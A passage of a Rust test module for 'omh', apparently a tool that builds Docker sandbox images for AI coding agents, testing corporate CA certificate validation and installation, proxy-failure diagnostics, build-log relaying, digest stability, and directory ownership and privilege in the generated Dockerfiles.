        let e = refuse(
            "p12.pem",
            "Bag Attributes\n    friendlyName: Zscaler Root CA\n    localKeyID: 01 00 00 00\nsubject=C=US, O=Zscaler Inc., CN=Zscaler Root CA\n-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n",
        );
        assert!(
            e.contains("friendlyName") || e.to_lowercase().contains("outside"),
            "the refusal must point at the preamble it will not drop: {e}"
        );

        // Truncated: a block that opens and never closes.
        let e = refuse("clipped.pem", "-----BEGIN CERTIFICATE-----\nQUJD\nWFla\n");
        assert!(
            e.to_lowercase().contains("end certificate") || e.to_lowercase().contains("truncated"),
            "a clipped paste must be named as unterminated: {e}"
        );

        // A CSR. `BEGIN CERTIFICATE REQUEST` contains `BEGIN CERTIFICATE`.
        let e = refuse(
            "req.pem",
            "-----BEGIN CERTIFICATE REQUEST-----\nQUJD\n-----END CERTIFICATE REQUEST-----\n",
        );
        assert!(
            !e.is_empty(),
            "a certificate request is not a certificate: {e}"
        );

        // And the shape that must still be accepted, unchanged: blank lines
        // around the blocks are ordinary in a PEM and are not preamble.
        let at = dir.path().join("spaced.pem");
        std::fs::write(
            &at,
            "\n-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n\n-----BEGIN CERTIFICATE-----\nWFla\n-----END CERTIFICATE-----\n\n",
        )
        .unwrap();
        let (_d, paths) = ca_fixture(Some(&at.display().to_string()));
        assert!(
            ca_for(&paths).unwrap().is_some(),
            "blank lines between blocks are not preamble"
        );
    }

    /// **The path that gets mounted is the path that was validated.**
    ///
    /// There used to be a `ca_path` beside `ca_for`: it called `ca_for` for the
    /// refusals and then read the settings a *second* time for the value, so
    /// nothing tied the two together — `docker run -v` got a path that had not
    /// been checked, from a reading `ca_for` never saw. `Root` carries both, so
    /// the pair cannot disagree and there is no second function to keep in
    /// step.
    ///
    /// It also refuses a relative path, which the old `ca_for` could not: a
    /// relative `ca_cert` *resolves* against the process CWD, so the PEM reads
    /// fine and the image is correct, while docker reads a non-absolute `-v`
    /// source as a **named volume** and mounts an empty directory where the
    /// certificate should be. `key::quarrel` warns at `omh set` time, but this
    /// key is `Secret::No` — it lands in the committed layer and arrives with a
    /// clone, and a hand-edited `settings.toml` never passes through `set` at
    /// all. The warning is advice; this is the refusal.
    #[test]
    fn a_root_carries_the_path_its_certificate_came_from() {
        let (dir, _) = ca_fixture(None);
        let at = dir.path().join("corp.pem");
        std::fs::write(&at, PEM).unwrap();

        let (_d, paths) = ca_fixture(Some(&at.display().to_string()));
        let root = ca_for(&paths).unwrap().expect("a certificate is set");
        assert_eq!(root.pem(), PEM, "the text the recipe embeds");
        assert_eq!(
            root.path(),
            at.as_path(),
            "and the file the cross-build mounts — one reading, so they agree"
        );

        // Relative: readable from this directory, which is what made it silent.
        let cwd = std::env::current_dir().unwrap();
        std::env::set_current_dir(dir.path()).unwrap();
        let (_d2, paths) = ca_fixture(Some("corp.pem"));
        let got = ca_for(&paths);
        std::env::set_current_dir(cwd).unwrap();

        let e = format!("{:#}", got.unwrap_err());
        assert!(
            e.contains("absolute"),
            "the refusal must say what is wrong with it: {e}"
        );
        assert!(
            e.contains("named volume") || e.contains("empty directory"),
            "and what docker would otherwise do: {e}"
        );
    }

    /// **A bundle is what corporate IT hands out, and it half-worked.**
    ///
    /// Measured against a real build: `update-ca-certificates` treats each
    /// file under `/usr/local/share/ca-certificates` as exactly one
    /// certificate. Given two in one file it prints
    /// `rehash: warning: skipping omh-ca.pem, it does not contain exactly one
    /// certificate or CRL` and `1 added` — both roots reach
    /// `ca-certificates.crt`, so the five variables pointing at the bundle
    /// work, but no `<hash>.0` symlink is made and `SSL_CERT_DIR`, which this
    /// recipe also sets, cannot find the root by hash.
    ///
    /// So the invariant is one file per certificate, and the count is the
    /// assertion: a chain of three must not become one file with three blocks.
    #[test]
    fn every_certificate_in_a_bundle_gets_its_own_file() {
        let one = "-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n";
        let two = "-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n\
                   -----BEGIN CERTIFICATE-----\nWFla\n-----END CERTIFICATE-----\n";

        let single = base_dockerfile(Some(one));
        let bundle = base_dockerfile(Some(two));

        let written = |recipe: &str| -> usize {
            recipe
                .lines()
                .filter(|l| !l.trim_start().starts_with('#'))
                // A *write into* the scanned directory. `cat ... > <bundle>`
                // names that directory too and is not one of these.
                .filter(|l| l.contains("> /usr/local/share/ca-certificates/omh-ca-"))
                .count()
        };
        assert_eq!(written(&single), 1, "one certificate, one file");
        assert_eq!(
            written(&bundle),
            2,
            "two certificates must be two files, or `update-ca-certificates` \
             hashes neither and `SSL_CERT_DIR` cannot find the root"
        );
        assert_ne!(
            recipe_digest(&single).unwrap(),
            recipe_digest(&bundle).unwrap(),
            "and a chain is not the same trust store as its root alone"
        );
    }

    /// **Node reads that one file and nothing else, so it must hold the whole
    /// chain.** The split above exists for `update-ca-certificates`, which
    /// wants one certificate per file; node wants the opposite, and gets it by
    /// concatenation. Nothing asserted the concatenation was a glob, so
    /// narrowing it to `omh-ca-1.crt` was green — and an intermediate-signed
    /// leaf then fails in node alone, on the machines this setting exists for,
    /// while curl and git keep working off the system store.
    ///
    /// Measured, three arms against an `openssl s_server` presenting a leaf
    /// signed by a private root: with no root installed every toolchain
    /// refuses; with the root in the system store and no variables set, curl,
    /// python, git, go, pip and cargo all verify and **node alone still fails**
    /// with `UNABLE_TO_VERIFY_LEAF_SIGNATURE`; with the variables set node
    /// verifies too. That is what makes this file, and not the store, node's
    /// only source of the root.
    #[test]
    fn the_file_node_reads_carries_the_whole_chain() {
        let two = "-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n\
                   -----BEGIN CERTIFICATE-----\nWFla\n-----END CERTIFICATE-----\n";
        let recipe = base_dockerfile(Some(two));

        // The variable names a path; that path must be built from every file
        // the split wrote, not from one of them.
        let node_at = "/usr/local/share/omh-ca.pem";
        assert!(
            recipe.contains(&format!("NODE_EXTRA_CA_CERTS={node_at}")),
            "node's variable must name the concatenated file: {recipe}"
        );
        let cat = recipe
            .lines()
            .find(|l| l.contains(&format!("> {node_at}")))
            .unwrap_or_else(|| panic!("nothing builds {node_at}: {recipe}"));
        assert!(
            cat.contains("omh-ca-*.crt"),
            "the file node reads is built from `{cat}`, which names one \
             certificate rather than the chain — a root behind an intermediate \
             then fails in node alone"
        );

        // And it is built after the files it concatenates, not before.
        let wrote_last = recipe
            .lines()
            .position(|l| l.contains("> /usr/local/share/ca-certificates/omh-ca-2.crt"))
            .expect("the second certificate is written");
        let concatenated = recipe
            .lines()
            .position(|l| l.contains(&format!("> {node_at}")))
            .expect("the chain is concatenated");
        assert!(
            wrote_last < concatenated,
            "the chain is assembled before its last certificate is written"
        );
    }

    /// **One resolution of `ca_cert` per command, and one way to hold it.**
    ///
    /// A second read can differ from the first, and then omh builds one image
    /// and names another — the split `0af80b9` closed in `session_up`, and
    /// which a review found still open in `doctor` and `init`.
    ///
    /// Two rules, and `Root` is what makes the second one cheap to check:
    ///
    /// 1. No function resolves twice.
    /// 2. `cmd::init::sandbox` does not resolve **at all** — it is handed the
    ///    caller's reading. Every command funnels through it, so while it
    ///    resolved independently, any caller that also needed the certificate
    ///    for a harness image resolved twice by construction.
    ///
    /// The scan no longer exempts `image.rs`. It used to, and that was a hole:
    /// `ca_path` lived there and called `ca_for`, so `omh s run` and
    /// `omh s attach` each resolved twice through `deliver`, invisibly. `Root`
    /// deleted `ca_path` — the path and the pem come off one reading now — so
    /// the exemption is gone with it and the scan can see the whole tree.
    #[test]
    fn no_command_resolves_the_certificate_twice() {
        let mut resolvers: Vec<String> = Vec::new();
        let mut twice: Vec<String> = Vec::new();
        let mut sandbox_resolves = false;
        let mut saw_sandbox_fn = false;
        // Production code only. A test may resolve as often as it likes.
        {
            for (path, body) in crate::testsrc::production() {
                let name = path
                    .strip_prefix(env!("CARGO_MANIFEST_DIR"))
                    .unwrap_or(&path)
                    .display()
                    .to_string();
                let lines: Vec<&str> = body.lines().collect();
                let opens = |l: &str| {
                    let l = l.trim_end();
                    l.starts_with("fn ")
                        || l.starts_with("pub fn ")
                        || l.starts_with("pub(crate) fn ")
                        || l.starts_with("async fn ")
                        || l.starts_with("pub async fn ")
                        || l.starts_with("pub(crate) async fn ")
                };
                let heads: Vec<usize> = (0..lines.len()).filter(|&n| opens(lines[n])).collect();
                for (k, &head) in heads.iter().enumerate() {
                    let end = heads.get(k + 1).copied().unwrap_or(lines.len());
                    let block = lines[head..end].join("\n");
                    // `ca_for` is the resolver; `Root::read` is its constructor
                    // and is private, so counting the resolver is enough.
                    let n = block.matches("ca_for(").count();
                    let sig = lines[head].trim_end();
                    if sig.contains(" sandbox(") {
                        saw_sandbox_fn = true;
                        if n > 0 {
                            sandbox_resolves = true;
                        }
                    }
                    if n > 0 {
                        resolvers.push(format!("{name}: {sig}"));
                    }
                    if n > 1 {
                        twice.push(format!("{name}: {sig} ({n})"));
                    }
                }
            }
        }

        assert!(
            twice.is_empty(),
            "these resolve `ca_cert` more than once, so the tag they name and \
             the layer they build can describe different images: {twice:#?}"
        );
        assert!(saw_sandbox_fn, "the scan never found `fn sandbox` at all");
        assert!(
            !sandbox_resolves,
            "`cmd::init::sandbox` resolves `ca_cert` itself. Every command \
             funnels through it, so a caller that also needs the certificate \
             for its harness image resolves twice — take the caller's reading \
             as a parameter instead"
        );

        // **Liveness by name.** A scan keyed on a spelling goes quiet the
        // moment the spelling changes, and an empty result would read as a
        // pass. These are the entry points that legitimately resolve once.
        for must in [
            "src/cmd/init.rs",
            "src/cmd/inspect.rs",
            "src/memory/deliver.rs",
        ] {
            assert!(
                resolvers.iter().any(|f| f.starts_with(must)),
                "{must} no longer resolves `ca_cert` under a spelling this \
                 scan can see — it reads less than it did: {resolvers:#?}"
            );
        }
    }

    /// **`Root::read` is the only way to hold one.** That is the whole of what
    /// the type buys: three comments in this file used to claim a value had
    /// "already been refused upstream", and none of them could be true of a
    /// function taking `&str`. A second constructor — or a `pub` field, or a
    /// `Root { .. }` literal anywhere else — would quietly restore that.
    #[test]
    fn nothing_builds_a_root_except_its_one_constructor() {
        let src = std::fs::read_to_string(file!()).unwrap();
        let body = crate::testsrc::production_of(&src);
        // `Root {` also opens the `struct` and its `impl`; neither builds one.
        let literals = body.matches("Root {").count()
            - body.matches("struct Root {").count()
            - body.matches("impl Root {").count();
        assert_eq!(
            literals, 0,
            "a `Root {{ .. }}` literal outside `read` is a way to build one \
             that skipped the refusals"
        );
        assert_eq!(
            body.matches("Self { path: at, pem }").count(),
            1,
            "and one construction, inside `read`"
        );
        assert!(
            !body.contains("pub path:") && !body.contains("pub pem:"),
            "the fields stay private, or the pem and the path can be swapped \
             for ones nothing validated"
        );
    }

    /// **The failure doctor's guest-side checks cannot reach.** Behind a
    /// TLS-inspecting proxy there is no image to inspect — the build dies on
    /// an unknown issuer, so every check that runs *inside* the sandbox is
    /// unreachable and the user is left with `failed to build omh/base:…` and
    /// a docker log they did not read. Doctor asks host-side too, since
    /// `3971fc6`; this is the half that fires when a build actually runs.
    ///
    /// The needles are the control arm of the measurement in `ca_layer`'s doc,
    /// verbatim: each is what that tool actually printed against a leaf signed
    /// by a private root with no root installed. A needle omh invented would
    /// be a guess presented as a diagnosis.
    #[test]
    fn a_build_that_died_on_an_unknown_issuer_names_the_setting() {
        // Measured, one per toolchain, in the control image.
        for (tool, said) in [
            ("curl", "curl: (60) SSL certificate problem: unable to get local issuer certificate"),
            ("node", "Error: unable to verify the first certificate ... UNABLE_TO_VERIFY_LEAF_SIGNATURE"),
            ("python", "ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed"),
            ("pip", "Could not fetch URL https://pypi.org/simple/: CERTIFICATE_VERIFY_FAILED"),
            ("go", "tls: failed to verify certificate: x509: certificate signed by unknown authority"),
            ("cargo", "error: the SSL certificate is invalid; class=Ssl (16)"),
            ("git", "fatal: unable to access: server certificate verification failed"),
        ] {
            let said = why_the_build_failed(said, false)
                .unwrap_or_else(|| panic!("{tool}'s failure was not recognised"));
            assert!(
                said.contains("ca_cert"),
                "{tool}: the diagnosis must name the setting that fixes it: {said}"
            );
            assert!(
                said.contains("omh set --local"),
                "{tool}: and the spelling that works — `omh settings set` writes \
                 a template nothing re-reads: {said}"
            );
        }

        // **A certificate already set is a different problem.** Telling
        // somebody to set `ca_cert` when they have is how a diagnosis becomes
        // noise; the likely cause is a chain missing its intermediate.
        let already = why_the_build_failed("x509: certificate signed by unknown authority", true)
            .expect("still recognised");
        assert!(
            !already.contains("omh set --local"),
            "do not tell somebody to set what they have already set: {already}"
        );
        assert!(
            already.contains("chain") || already.contains("doctor"),
            "it must say what to check instead: {already}"
        );

        // **Silence is the default.** An ordinary build failure must not be
        // dressed up as a proxy problem — the setting would be a red herring
        // and the real error is in the log.
        for ordinary in [
            "ERROR: failed to solve: process \"/bin/sh -c apt-get install -y nosuchpkg\" did not complete successfully: exit code: 100",
            "no space left on device",
            "",
        ] {
            assert_eq!(
                why_the_build_failed(ordinary, false),
                None,
                "an ordinary failure must not be diagnosed as a proxy: {ordinary}"
            );
        }
    }

    /// **The tee must not deadlock, and only a real build can say so.**
    ///
    /// omh sends the recipe on `-f -`, so docker reads stdin until EOF.
    /// `Child::wait` closes stdin for you — but reading stderr happens
    /// *before* the wait, so a version of `build` that leaves stdin open hangs
    /// forever against a docker that is still waiting for the end of its
    /// recipe. No unit test sees that: it is a property of two real pipes.
    ///
    /// Also asserts the diagnosis reaches the error, using a recipe that fails
    /// while printing what a proxy prints. That is a real non-zero build, not
    /// a string handed to `why_the_build_failed`.
    ///
    /// `#[ignore]` because it needs a container runtime. `./scripts/check.sh
    /// --all` runs it.
    #[test]
    #[ignore]
    fn a_real_build_streams_its_log_and_diagnoses_a_proxy() {
        let docker = "docker";
        // A build that succeeds: proves the tee does not deadlock.
        let ok = build(
            docker,
            "omh-test/tee-ok:1",
            "FROM alpine:3\nRUN echo built-fine\n",
            &Kind::Base,
            None,
        );
        assert!(ok.is_ok(), "a trivial build must succeed: {ok:?}");

        // A build that fails the way a TLS-inspecting proxy makes it fail.
        let said = build(
            docker,
            "omh-test/tee-fail:1",
            "FROM alpine:3\nRUN echo 'x509: certificate signed by unknown authority' >&2 && exit 1\n",
            &Kind::Base,
            None,
        )
        .expect_err("that recipe must fail");
        let said = format!("{said:#}");
        assert!(
            said.contains("ca_cert"),
            "a build that died on an unknown issuer must name the setting: {said}"
        );
        assert!(
            said.contains("omh set --local"),
            "and the spelling that works: {said}"
        );

        // **A harness layer, with a certificate already set.** This is the
        // case the derivation got wrong: only the *base* recipe carries
        // `update-ca-certificates`, so sniffing the recipe text called every
        // harness and stack build "no certificate" — and the harness layer is
        // the `npm install -g` that a chain missing its intermediate actually
        // breaks. Telling that user to set `ca_cert` is the noise the second
        // message exists to prevent. The unit test above cannot see it,
        // because it hands the flag in by hand.
        let pem = "-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n";
        let adapter = claude();
        let already = build(
            docker,
            "omh-test/tee-harness:1",
            // Harness-shaped: `FROM`, a `RUN`, and no `ca_layer` anywhere.
            "FROM alpine:3\nRUN echo 'UNABLE_TO_VERIFY_LEAF_SIGNATURE' >&2 && exit 1\n",
            &Kind::Harness(&adapter),
            Some(pem),
        )
        .expect_err("that recipe must fail");
        let already = format!("{already:#}");
        assert!(
            !already.contains("omh set --local"),
            "the certificate is set; do not tell them to set it: {already}"
        );
        assert!(
            already.contains("chain") || already.contains("doctor"),
            "it must say what to check instead: {already}"
        );

        // And an ordinary failure stays ordinary.
        let plain = build(
            docker,
            "omh-test/tee-plain:1",
            "FROM alpine:3\nRUN exit 1\n",
            &Kind::Base,
            None,
        )
        .expect_err("that recipe must fail");
        assert!(
            !format!("{plain:#}").contains("ca_cert"),
            "an ordinary failure must not be dressed up as a proxy problem"
        );
    }

    /// **One byte that is not UTF-8 must not end the build log.**
    ///
    /// `read_line` answers `InvalidData` for such a byte, and the first
    /// version folded that into "the stream ended" with `unwrap_or(0)`. Three
    /// things followed, all silent: the relay stopped, so a multi-minute build
    /// went quiet where `Stdio::inherit` had shown everything; the captured log
    /// was truncated, so a certificate error after that byte was never
    /// diagnosed; and nothing drained a pipe the child was still filling.
    ///
    /// Driven through a real child process rather than a `Cursor`, because the
    /// thing under test is a pipe. **Not** through docker: BuildKit re-encodes
    /// what a `RUN` step writes, so a recipe emitting `\377` arrives as valid
    /// UTF-8 and passes either way — a test that cannot fail.
    #[test]
    fn a_byte_that_is_not_utf8_does_not_truncate_the_log() {
        let mut child = std::process::Command::new("sh")
            .arg("-c")
            .arg("printf 'step 1/3\\n' >&2; printf '\\377\\n' >&2; printf 'x509: certificate signed by unknown authority\\n' >&2")
            .stderr(std::process::Stdio::piped())
            .spawn()
            .expect("sh");
        let log = relay(child.stderr.take().expect("piped"));
        let _ = child.wait();

        assert!(
            log.contains("step 1/3"),
            "the lines before the bad byte are kept: {log:?}"
        );
        assert!(
            log.contains("x509: certificate signed by unknown authority"),
            "and so is everything after it — this is the assertion that was red \
             before `read_until`: {log:?}"
        );
        assert!(
            why_the_build_failed(&log, false).is_some(),
            "so the diagnosis still fires on a log with an ugly byte in it"
        );
    }

    /// A repo whose stacks install nothing runs the harness image itself.
    /// Building an empty layer to hold nothing would cost every such repo a
    /// build, a tag and a pull for no content.
    #[test]
    fn nothing_to_install_is_the_harness_image_itself() {
        assert_eq!(stack_tag(&claude(), &[], None), tag_for(&claude(), None));
    }

    /// File order is install order, and it is load-bearing: `corepack enable
    /// pnpm` needs the node the provide above it asserted. An ordered list is
    /// how a stack file says that without a dependency graph — so the recipe
    /// must not reorder it.
    #[test]
    fn installs_run_in_the_order_the_stack_file_gave() {
        // Deliberately *not* in alphabetical order. Given `["a", "b"]` a
        // sorting implementation is indistinguishable from a faithful one —
        // which is what the first version of this test asserted, and it passed
        // against a `sort()` inserted to break it.
        let df = stack_dockerfile(
            &claude(),
            &["zzz corepack enable pnpm", "aaa apt-get install nodejs"],
            None,
        );
        let at = |needle: &str| df.find(needle).unwrap_or_else(|| panic!("missing: {df}"));
        assert!(
            at("zzz corepack") < at("aaa apt-get"),
            "the recipe was reordered — file order is install order, and \
             `corepack enable pnpm` needs the node above it:\n{df}"
        );
    }

    #[test]
    fn a_changed_recipe_is_a_different_tag() {
        let mut a = claude();
        let before = tag_for(&a, None);
        a.install = "npm install -g @anthropic-ai/claude-code@next".into();
        assert_ne!(
            tag_for(&a, None),
            before,
            "a changed recipe must force a rebuild"
        );
    }

    #[test]
    fn an_unchanged_recipe_keeps_its_tag() {
        assert_eq!(tag_for(&claude(), None), tag_for(&claude(), None));
    }

    /// The four things `sbx` requires of a kit base image. Getting these wrong
    /// means the image works on Docker and silently cannot be used on the other
    /// backend — the exact split this project exists to avoid.
    #[test]
    fn the_base_satisfies_the_sandbox_contract() {
        let df = base_dockerfile(None);
        assert!(
            df.contains("-u 1000") || df.contains("1000"),
            "UID 1000: {df}"
        );
        assert!(df.contains("agent"), "agent user");
        assert!(df.contains(GUEST_HOME), "home directory");
        assert!(df.contains("NOPASSWD"), "passwordless sudo");
    }

    /// The image is what *establishes* the home, and everything that mounts
    /// into a session assumes it. Those were separate literals in four files —
    /// consistent by copying, which holds until somebody changes one.
    ///
    /// The Dockerfile now interpolates the constant, so this asserts the build
    /// really does create and verify that path rather than a similar-looking
    /// one.
    #[test]
    fn the_image_creates_the_home_the_code_mounts_into() {
        let df = base_dockerfile(None);
        assert!(
            df.contains(&format!("usermod -l agent -d {GUEST_HOME}")),
            "the image must create the home the launcher mounts into:\n{df}"
        );
        assert!(
            df.contains(&format!("cut -d: -f6)\" = \"{GUEST_HOME}\"")),
            "and assert it at build time, not trust it:\n{df}"
        );
    }

    /// `GRAPH_CACHE` repeats the home rather than deriving it, because const
    /// concatenation of a `&str` const needs a macro crate. This is the guard
    /// that makes the repetition safe.
    #[test]
    fn the_graph_cache_lives_under_the_agents_home() {
        assert!(
            GRAPH_CACHE.starts_with(&format!("{GUEST_HOME}/")),
            "graph cache {GRAPH_CACHE} is not under {GUEST_HOME}"
        );
        assert!(
            base_dockerfile(None).contains(GRAPH_CACHE),
            "the image must create the cache directory, or docker makes it root-owned"
        );
    }

    /// The digest must not depend on the repository omh happens to be launched
    /// from.
    ///
    /// `recipe_digest` spawns git with no `current_dir`, so the ambient
    /// repository is whatever the user's shell was in — and a repository
    /// created with `--object-format=sha256` answers `hash-object` in 64 hex
    /// instead of 40. Every image-pinned note that user commits then carries a
    /// digest nobody else's omh will ever compute.
    ///
    /// Asserted over the *command shape* rather than by changing the process's
    /// directory: `set_current_dir` is process-global, and a test that moves it
    /// moves it for every other test running beside it.
    #[test]
    fn a_recipe_digest_does_not_inherit_the_repository_it_is_run_beside() {
        let dir = tempfile::tempdir().unwrap();
        let odd = dir.path().join("sha256");
        let made = std::process::Command::new("git")
            .args(["init", "-q", "--object-format=sha256"])
            .arg(&odd)
            .output()
            .expect("git must be installed to run this test");
        if !made.status.success() {
            return; // git too old for sha256; nothing to prove here
        }

        // omh's own command, run from inside that repository — the thing under
        // test — against a bare one that inherits it, which is the premise.
        let run = |pinned: bool| {
            let mut c = if pinned {
                digest_command()
            } else {
                let mut c = std::process::Command::new("git");
                c.args(["hash-object", "--stdin"]);
                c
            };
            c.current_dir(&odd);
            let mut ch = c
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .spawn()
                .unwrap();
            use std::io::Write;
            ch.stdin.take().unwrap().write_all(b"a recipe").unwrap();
            let out = ch.wait_with_output().unwrap();
            String::from_utf8_lossy(&out.stdout).trim().to_string()
        };

        let inherited = run(false);
        let pinned = run(true);
        assert_eq!(
            inherited.len(),
            64,
            "the premise: a sha256 repository answers in 64 hex"
        );
        assert_eq!(
            pinned,
            recipe_digest("a recipe").unwrap(),
            "and omh's digest must be the same wherever it was run from"
        );
    }

    /// The one place a literal is correct: the whole point of this digest is
    /// that the value never moves. `DefaultHasher` would pass every test here
    /// and change under a toolchain upgrade, marking every image-pinned note in
    /// every repo stale on the same day.
    #[test]
    fn an_image_recipe_digest_is_stable_across_toolchains() {
        assert_eq!(
            recipe_digest("hello\n").unwrap(),
            "ce013625030ba8dba906f756967f9e9ca394464a",
            "this is git's SHA-1 of the blob and it is not allowed to change"
        );
        // Same recipe, same digest; different recipe, different digest.
        assert_eq!(recipe_digest("a").unwrap(), recipe_digest("a").unwrap());
        assert_ne!(recipe_digest("a").unwrap(), recipe_digest("b").unwrap());
    }

    /// A bind mount whose guest directory does not exist is created by docker
    /// as **root**, and the agent then cannot write the note it was told to
    /// record — the same failure the graph cache and every credential mount
    /// already pay for.
    ///
    /// Asserted against the mount constant rather than a literal, so moving
    /// the mount without preparing its new home cannot stay green.
    #[test]
    fn the_image_creates_the_note_store_the_launcher_mounts_into() {
        let df = base_dockerfile(None);
        let notes = crate::memory::GUEST_LOCAL_NOTES;
        assert!(
            df.contains(notes),
            "the image must create {notes}, or docker makes it root-owned"
        );

        // Created is not enough — it has to be handed to the agent. `/omh` is
        // chowned wholesale, so the real requirement is that the store stays
        // under a prefix that chown covers.
        let owned = df
            .lines()
            .find(|l| l.contains("chown -R agent:agent"))
            .expect("the image must chown its mount points");
        assert!(
            owned
                .split_whitespace()
                .any(|dir| notes == dir || notes.starts_with(&format!("{dir}/"))),
            "{notes} is not covered by: {owned}"
        );
    }

    /// One definition, and no file quietly reintroducing its own.
    #[test]
    fn the_guest_home_is_defined_once() {
        let src = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
        let mut declarations = Vec::new();
        for entry in std::fs::read_dir(&src).unwrap().flatten() {
            let path = entry.path();
            if path.extension().is_some_and(|e| e == "rs") {
                let body = std::fs::read_to_string(&path).unwrap();
                for line in body.lines() {
                    let l = line.trim();
                    let is_const = l.starts_with("const ") || l.starts_with("pub const ");
                    if is_const && l.contains("= \"/home/agent\"") {
                        declarations.push(format!("{}: {l}", path.display()));
                    }
                }
            }
        }
        assert_eq!(
            declarations.len(),
            1,
            "the agent's home should be declared once:\n  {}",
            declarations.join("\n  ")
        );
    }

    /// Everything a session needs regardless of harness. `dtach` in particular:
    /// without it the persistence wrapper fails at launch, not at build.
    #[test]
    fn the_base_provides_what_every_session_needs() {
        let df = base_dockerfile(None);
        for tool in ["git", "dtach", "ripgrep"] {
            assert!(df.contains(tool), "missing {tool}: {df}");
        }
    }

    /// `omh s attach` attaches an IDE over SSH, so the session has to serve it.
    /// The base set has to be *in* the image, or every session starts without
    /// the thing that makes omh more than a launcher.
    #[test]
    fn the_base_image_carries_the_base_set() {
        let df = base_dockerfile(None);
        assert!(df.contains(crate::base::GRAPH_BIN), "no code graph: {df}");
    }

    /// The cache is a volume; the image only needs the directory to exist and
    /// be owned by the agent, or docker creates it as root.
    #[test]
    fn the_base_owns_the_graph_cache_directory() {
        let df = base_dockerfile(None);
        assert!(df.contains(crate::base::GRAPH_CACHE), "got: {df}");
    }

    #[test]
    fn the_base_can_serve_ssh() {
        let df = base_dockerfile(None);
        assert!(df.contains("openssh-server"), "got: {df}");
        assert!(df.contains("omh-session"), "needs a session entrypoint");
    }

    /// The key arrives as an env var rather than a mount: a bind-mounted
    /// authorized_keys lands with host ownership, and sshd silently refuses to
    /// read one it does not trust.
    #[test]
    fn the_session_entrypoint_installs_the_key_with_permissions_sshd_accepts() {
        let df = base_dockerfile(None);
        assert!(
            df.contains("OMH_PUBKEY"),
            "key must come from the environment"
        );
        assert!(df.contains("chmod 700"), "~/.ssh perms");
        assert!(df.contains("chmod 600"), "authorized_keys perms");
    }

    #[test]
    fn the_session_entrypoint_outlives_the_command_that_started_it() {
        let df = base_dockerfile(None);
        assert!(df.contains("sshd"), "must start sshd");
        assert!(df.contains("sleep infinity"), "PID 1 must not exit");
    }

    #[test]
    fn the_base_creates_the_paths_the_launcher_mounts_into() {
        let df = base_dockerfile(None);
        for dir in ["/work", "/omh/sock", "/omh/cache"] {
            assert!(df.contains(dir), "missing {dir}: {df}");
        }
    }

    #[test]
    fn the_harness_layer_extends_the_base_and_installs_the_harness() {
        let df = harness_dockerfile(&claude(), None);
        assert!(
            df.contains(&format!("FROM {}", base_tag(None))),
            "got: {df}"
        );
        assert!(
            df.contains("@anthropic-ai/claude-code"),
            "install command: {df}"
        );
    }

    /// Installing needs root; running must not have it. A base that ends as
    /// root hands the agent the sandbox's own escape hatch.
    /// Docker creates a missing mount parent as **root**. That makes
    /// `~/.claude` unwritable for the agent, which breaks anything writing a
    /// new file there — transcripts fail with EACCES, and an atomic credential
    /// write (temp file + rename, which needs write permission on the
    /// directory) fails while the login itself reports success.
    ///
    /// The harness layer knows every path it will mount into, so it can create
    /// them up front with the right owner.
    #[test]
    fn the_harness_layer_owns_the_directories_it_mounts_into() {
        let df = harness_dockerfile(&claude(), None);
        assert!(df.contains("/home/agent/.claude"), "config dir: {df}");
        assert!(
            df.contains("chown"),
            "must be owned by agent, not root: {df}"
        );
    }

    /// Asserted on the parsed list, not a positional substring: the old form
    /// checked `!df.contains("mkdir -p /work")`, which sorting guaranteed could
    /// never appear even with the filter removed entirely.
    #[test]
    fn only_directories_under_the_agents_home_are_created() {
        for name in ["claude", "opencode"] {
            let a = Adapter::find(adapters(), name).unwrap();
            for dir in mount_parents(&a) {
                assert!(
                    dir.starts_with("/home/agent"),
                    "{name}: {dir} is not ours to create"
                );
            }
        }
    }

    /// The load-bearing half of this fix is the credential paths, and the only
    /// adapter that exercises it is opencode — deleting the `creds` chain left
    /// the whole suite green.
    #[test]
    fn credential_directories_are_created_too() {
        let a = Adapter::find(adapters(), "opencode").unwrap();
        let dirs = mount_parents(&a);
        assert!(
            dirs.iter().any(|d| d.contains("/.local/share")),
            "the creds parent must be created: {dirs:?}"
        );
    }

    /// Every home-side mount omh makes needs its parent created, or docker
    /// makes it root-owned and the agent cannot write beside its own config.
    #[test]
    fn every_home_side_mount_has_its_parent_created() {
        for name in ["claude", "opencode"] {
            let a = Adapter::find(adapters(), name).unwrap();
            let created = mount_parents(&a);
            let wanted = a
                .capabilities
                .values()
                .map(|b| b.path.clone())
                .chain(a.creds.iter().cloned())
                .chain(a.token.iter().cloned());
            for template in wanted {
                let p = crate::adapter::expand(template.trim_end_matches('/'), "/home/agent");
                if !p.starts_with(GUEST_HOME) {
                    continue;
                }
                let Some(parent) = p.parent().map(|x| x.display().to_string()) else {
                    continue;
                };
                if parent == GUEST_HOME {
                    continue; // the base image already owns the home itself
                }
                assert!(
                    created
                        .iter()
                        .any(|d| parent == *d || parent.starts_with(&format!("{d}/"))),
                    "{name}: nothing creates {parent} for {template}"
                );
            }
        }
    }

    /// Installing needs root; running must not have it. An image that ends as
    /// root hands the agent the sandbox's own escape hatch.
    #[test]
    fn images_end_as_the_unprivileged_user() {
        // The stack layer installs as root like the harness layer does, so it
        // is the newest way to end an image privileged — and an image that ends
        // privileged hands the agent the sandbox's own escape hatch.
        for df in [
            base_dockerfile(None),
            harness_dockerfile(&claude(), None),
            stack_dockerfile(&claude(), &["apt-get install -y gcc"], None),
        ] {
            let last_user = df
                .lines()
                .rfind(|l| l.trim_start().starts_with("USER "))
                .unwrap_or("");
            assert_eq!(last_user.trim(), "USER agent", "ended privileged:\n{df}");
        }
    }

    /// …and the stack layer *begins* as root, which the test above cannot see.
    ///
    /// It reads only the last `USER`, so dropping `USER root` from
    /// `stack_dockerfile` leaves it green — and the layer would then run
    /// `apt-get install gcc` as `agent`. Every recipe that installs anything
    /// system-wide fails, which is loud, but it fails at *image build* on data
    /// that is correct, and the person reading the error has no reason to
    /// suspect the Dockerfile omh generated.
    ///
